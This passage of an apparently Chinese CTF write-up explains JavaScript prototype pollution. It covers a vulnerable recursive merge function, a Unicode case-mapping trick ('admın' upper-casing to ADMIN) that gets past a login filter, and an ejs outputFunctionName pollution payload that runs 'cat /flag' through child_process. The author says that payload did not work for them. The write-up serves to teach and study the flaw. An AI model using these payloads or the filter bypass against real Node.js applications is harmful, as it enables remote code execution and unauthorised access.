class="property">__proto__</span>.<span class="property">__proto__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">&#123;&#125;</span><br><span class="line">[<span class="title class_">Object</span> :<span class="literal">null</span> prototype]&#123;&#125;</span><br><span class="line"><span class="variable constant_">NULL</span></span><br></pre></td></tr></table></figure>
+<p>NULL为链的的末端。</p>
+<h3 id="js中类的继承机制"><a class="markdownIt-Anchor" href="#js中类的继承机制"></a> JS中类的继承机制</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&quot;wang&quot;</span>;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">age</span>=<span class="number">19</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&quot;pan&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置b的父类为a</span></span><br><span class="line">b.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title function_">a</span>();<span class="comment">//b继承了a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义c对象</span></span><br><span class="line">c=<span class="keyword">new</span> <span class="title function_">b</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name=<span class="subst">$&#123;c.name&#125;</span> age=<span class="subst">$&#123;c.age&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">name=pan age=<span class="number">19</span></span><br></pre></td></tr></table></figure>
+<p>可以看到c为b类产生的对象，但是再输出是却又age属性。<br />
+这就是继承，b类继承了a的age属性。但却没有继承a的name属性，因为b已经有了</p>
+<p>现在这句话就很好理解了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在JavaScript中，每个对象都有一个原型，它是一个指向另一个对象的引用。当我们访问一个对象的属性时，如果该对象没有这个属性，JavaScript引擎会在它的原型对象中查找这个属性。这个过程会一直持续，直到找到该属性或者到达原型链的末尾。</span><br></pre></td></tr></table></figure>
+<p>原型链图示：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">c</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;pan&quot;</span>,       <span class="comment">// 来自 b 构造函数（覆盖原型）</span></span><br><span class="line">    <span class="attr">__proto__</span>: b.<span class="property"><span class="keyword">prototype</span></span> → &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;wang&quot;</span>,   <span class="comment">// 来自 a 构造函数</span></span><br><span class="line">        <span class="attr">age</span>: <span class="number">19</span>,       <span class="comment">// 来自 a 构造函数</span></span><br><span class="line">        <span class="attr">__proto__</span>: a.<span class="property"><span class="keyword">prototype</span></span> → &#123;</span><br><span class="line">            <span class="attr">constructor</span>: <span class="title function_">a</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>总结：</p>
+<ol>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+<li>每个对象都有一个名为<code>__proto__</code>的内置属性，它指向该对象的原型，每个函数/类也都有一个名为 <code>prototype </code>的属性，它指向该函数或类的原型</li>
+<li>当一个类实例化后会用于<code>prototype</code>中所有的属性和方法</li>
+</ol>
+<h2 id="漏洞思路"><a class="markdownIt-Anchor" href="#漏洞思路"></a> 漏洞思路</h2>
+<h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3>
+<p><strong>现在已经知道实例化的对象的 <code>.__proto__</code> 指向类的 <code>prototype</code></strong></p>
+<p><strong>那么修改了实例化的对象的 <code>.__proto__</code> 的内容, 类的 <code>prototype</code> 的内容是否也会发生改变？</strong></p>
+<p><strong>答案是肯定的，这就是原型链污染的利用方法。</strong></p>
+<p>哪些情况下我们可以设置 <code>__proto__</code> 的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
+<ul>
+<li>对象 merge</li>
+<li>对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li>
+</ul>
+<p>一个经典的递归漏洞。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;输入&#x27;</span>) <span class="comment">//解析用户输入的 JSON 字符串为对象 o2。</span></span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
+<p><code>merge</code> 函数的作用是 <strong>递归合并两个对象</strong>，将 <code>source</code> 对象的属性复制到 <code>target</code> 对象中。如果某个属性在 <code>target</code> 和 <code>source</code> 中都存在，则递归合并它们的值；否则直接复制。</p>
+<p>举例：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> target = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span>,</span><br><span class="line">    <span class="attr">address</span>: &#123;</span><br><span class="line">        <span class="attr">city</span>: <span class="string">&quot;Beijing&quot;</span>,</span><br><span class="line">        <span class="attr">street</span>: <span class="string">&quot;Main St&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> source = &#123;</span><br><span class="line">    <span class="attr">age</span>: <span class="number">26</span>,             <span class="comment">// 覆盖 target.age</span></span><br><span class="line">    <span class="attr">address</span>: &#123;           <span class="comment">// 递归合并 address</span></span><br><span class="line">        <span class="attr">street</span>: <span class="string">&quot;Second St&quot;</span>,  <span class="comment">// 覆盖 target.address.street</span></span><br><span class="line">        <span class="attr">zip</span>: <span class="string">&quot;100001&quot;</span>    <span class="comment">// 新增 target.address.zip</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">job</span>: <span class="string">&quot;Engineer&quot;</span>      <span class="comment">// 新增 target.job</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">merge</span>(target, source);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(target);</span><br></pre></td></tr></table></figure>
+<p>合并结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    name: &quot;Alice&quot;,</span><br><span class="line">    age: 26,                     // 被 source.age 覆盖</span><br><span class="line">    address: &#123;</span><br><span class="line">        city: &quot;Beijing&quot;,         // 保留原值</span><br><span class="line">        street: &quot;Second St&quot;,     // 被 source.address.street 覆盖</span><br><span class="line">        zip: &quot;100001&quot;           // 新增属性</span><br><span class="line">    &#125;,</span><br><span class="line">    job: &quot;Engineer&quot;             // 新增属性</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对于merge函数是一个经典的递归<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=241608406&amp;content_type=Article&amp;match_order=1&amp;q=js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93&amp;zhida_source=entity">js原型链污染</a>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>输入以上代码就能造成原型链污染</p>
+<p>使o3拥有属性b。</p>
+<h3 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h3>
+<p>首先解释：<br />
+<strong>所有对象的顶层模型都是Object.prototype</strong></p>
+<p><code>o1.__proto__==Object.prototype</code></p>
+<p><code>O2.__proto__==Object.prototype</code></p>
+<p><code>O3.__proto__==Object.prototype</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;输入&#x27;</span>) <span class="comment">//解析用户输入的 JSON 字符串为对象 o2。</span></span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
+<p>假设输入：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;b&quot;</span>: <span class="string">&quot;polluted&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行流程：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;b&quot;: &quot;polluted&quot;&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2) 会将 o2.<span class="property">__proto__</span>.<span class="property">b</span> 合并到 o1.<span class="property">__proto__</span>（即 <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>）</span><br><span class="line">由于 <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> 被修改，所有对象都会继承属性 <span class="title function_">b</span>(因为所有对象都没有b这个属性)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>) 会输出 <span class="string">&quot;polluted&quot;</span>，因为 o3 继承了被污染的 <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//o3.b 输出 &quot;polluted&quot;：因为 Object.prototype 被污染，所有对象通过原型链继承 b。</span></span><br><span class="line">o1.<span class="property">b</span> 输出 <span class="literal">undefined</span>：merge 未将 b 复制到 o1 自身，且原型属性可能未被正确访问。</span><br><span class="line">o2.<span class="property">b</span> 能输出 <span class="string">&quot;polluted&quot;</span>，是因为 b 是 o2 的原型对象的属性。</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250414203420323.png" alt="image-20250414203420323" /></p>
+<h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2>
+<p>题目界面</p>
+<p><img src="../images/20250415142554101.png" alt="image-20250415142554101" /></p>
+<p><img src="../images/20250415142950087.png" alt="image-20250415142950087" /></p>
+<p>必须要以ADMIN的身份登录</p>
+<p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过审代码我们发现，注册的时候调用了safeKeyword函数，这个函数使我们注册时不能用admin，但是又需要题目要求用ADMIN登录才行</p>
+<h3 id="js大小写特性"><a class="markdownIt-Anchor" href="#js大小写特性"></a> JS大小写特性</h3>
+<p><img src="../images/20250415143137670.png" alt="image-20250415143137670" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这两个字符的“大写”是I和S。也就是说&quot;ı&quot;.toUpperCase() == ‘I’，“ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</span><br><span class="line"></span><br><span class="line">同样，toLowerCase也有同样的字符：</span><br><span class="line"></span><br><span class="line">这个&quot;K&quot;的“小写”字符是k，也就是&quot;K&quot;.toLowerCase() == ‘k’.</span><br><span class="line"></span><br><span class="line">也就是说admın进行大写转换后会使ADMIN</span><br></pre></td></tr></table></figure>
+<p>直接输入<code>admın</code>,点击注册</p>
+<p>进去了</p>
+<p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250415143407401.png" alt="image-20250415143407401" /></p>
+<p>有提示flag在/flag中</p>
+<p>进去之后就要想办法在action路由中调用merge和clone来进行原型链污染了</p>
+<p>存在原型链污染：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>clone()的使用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>重点：<strong>res.outputFunctionName=undefined;</strong></p>
+<p>恶意代码构建：<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE - evi0s’ Blog</a></p>
+<p><img src="../images/20250415144843768.png" alt="image-20250415144843768" /></p>
+<p>题目这里正好也用到ejs渲染outputFunctionName，漏洞分析的<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">文章</a>是这么说明该漏洞的，还给了RCE代码</p>
+<p><img src="../images/20250415144923178.png" alt="image-20250415144923178" /></p>
+<p>简而言之也就是说，<strong>只要我们利用污染连污染了outputFunctionName，那么后面模板渲染的时候他就会执行我们污染时写进去的代码</strong></p>
+<p>直接抓包，将<code>Content-Type: application/json</code></p>
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;proto&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250415150855244.png" alt="image-20250415150855244" /></p>
+<p>直接访问/info就能看到flag了(我没成功，不知道为什么)</p>
+<h2 id="bypass"><a class="markdownIt-Anchor" href="#bypass"></a> Bypass</h2>
+<p>过滤了<code>__proto__</code>可以用<code>constructor.prototype</code>绕过</p>
